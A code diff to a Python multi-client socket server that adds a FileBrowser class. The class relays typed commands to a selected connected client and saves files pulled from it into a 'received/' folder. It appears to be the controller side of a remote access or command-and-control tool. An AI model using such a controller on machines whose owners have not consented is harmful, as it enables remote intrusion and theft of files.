@@ -2,6 +2,8 @@ import socket
 import threading
 import os
 import sys
+import uuid
+
 
 class Server:
 
@@ -12,7 +14,6 @@ class Server:
         self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         self.socket.bind((hostname, port))
         self.socket.listen(5)
-        self.run()
 
     def accept_connections(self):
 
@@ -64,7 +65,7 @@ class Server:
                 with self.locking:
                     try:
                         client = self.connections[int(client_id)]
-                        file_browser(client)
+                        FileBrowser(client).run()
                     except IndexError:
                         print("Index does not exist. \n")
             elif option == "0":
@@ -74,3 +75,48 @@ class Server:
                 print("\nPerhaps you better start from the beginning.")
                 input("")
                 os.system("clear")
+
+
+class FileBrowser:
+
+    def __init__(self, client):
+        self.client = client
+
+    def file_transfer(self):
+        name = uuid.uuid4().hex
+        f = open("received/" + name, 'wb')
+
+        while True:
+            l = self.client[0].recv(4096)
+            while (l):
+                if l.endswith(bytes("EOFX", "UTF-8")):
+                    u = l[:-4]
+                    f.write(u)
+                    break
+                else:
+                    f.write(l)
+                    l = self.client[0].recv(4096)
+            break
+        f.close()
+
+    def run(self):
+
+        self.client[0].sendall(bytes("1", "UTF-8"))
+        client_pwd = self.client[0].recv(4096).decode("UTF-8")
+        print(client_pwd)
+        exit = False
+        while not exit:
+            command = input("Type a command: ")
+            if command == "exit":
+                self.client[0].sendall(bytes(command, "UTF-8"))
+                exit = True
+                os.system("clear")
+            elif command == "clear":
+                os.system("clear")
+            else:
+                self.client[0].sendall(bytes(command, "UTF-8"))
+                aux = command.split("~")
+                if aux[0] == "cp":
+                    self.file_transfer()
+                received = self.client[0].recv(4096).decode("UTF-8")
+                print(received)
